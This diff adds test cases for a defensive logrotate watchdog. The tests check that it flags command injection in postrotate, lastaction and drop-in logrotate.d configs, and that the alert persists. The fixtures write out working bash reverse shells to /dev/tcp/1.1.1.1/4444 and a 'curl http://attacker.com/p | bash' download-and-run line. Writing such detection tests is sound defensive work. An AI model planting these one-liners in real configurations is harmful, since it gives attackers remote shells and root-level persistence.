@@ -178,3 +178,84 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-logrotate -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): logrotate-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
+    # T1546 recurring root-exec persistence — alert must persist.
+    seed_benign
+    run_wd
+    printf '/var/log/x.log {\n  postrotate\n    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"logrotate_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${CONF}" <<'EOF'
+/var/log/nginx/*.log {
+  weekly
+  postrotate
+    # future: bash -i >& /dev/tcp/evil/4444 0>&1
+    /usr/bin/systemctl reload nginx
+  endscript
+}
+EOF
+    run_wd
+    ! cap | grep -q '"event":"logrotate_suspicious"'
+}
+
+@test "INVARIANT (logrotate.d drop-in axis: injection in /etc/logrotate.d/*.conf → alert; not only main /etc/logrotate.conf)" {
+    # Attackers may plant injection in /etc/logrotate.d/00-evil.conf
+    # to avoid touching main /etc/logrotate.conf. Watchdog must
+    # walk logrotate.d/ too.
+    LOGROTATED="${TMP}/logrotate.d"
+    mkdir -p "${LOGROTATED}"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+        SELFDEF_MODULE_LIB="${LIB}" \
+        SELFDEF_LOGROTATE_PROFILE=report \
+        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
+        SELFDEF_LOGROTATE_FILE="${CONF}" \
+        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
+        bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${LOGROTATED}/00-evil" <<'EOF'
+/var/log/evil.log {
+  postrotate
+    curl -s http://attacker.com/p | bash
+  endscript
+}
+EOF
+    PATH="${BIN}:${PATH}" \
+        SELFDEF_MODULE_LIB="${LIB}" \
+        SELFDEF_LOGROTATE_PROFILE=report \
+        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
+        SELFDEF_LOGROTATE_FILE="${CONF}" \
+        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
+        bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (lastaction block also scanned — not just postrotate+prerotate+firstaction)" {
+    # logrotate has 4 action block types: prerotate/postrotate/
+    # firstaction/lastaction. The pre-existing tests cover the
+    # first 3. Lock lastaction coverage too.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${CONF}" <<'EOF'
+/var/log/x.log {
+  weekly
+  lastaction
+    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1
+  endscript
+}
+EOF
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
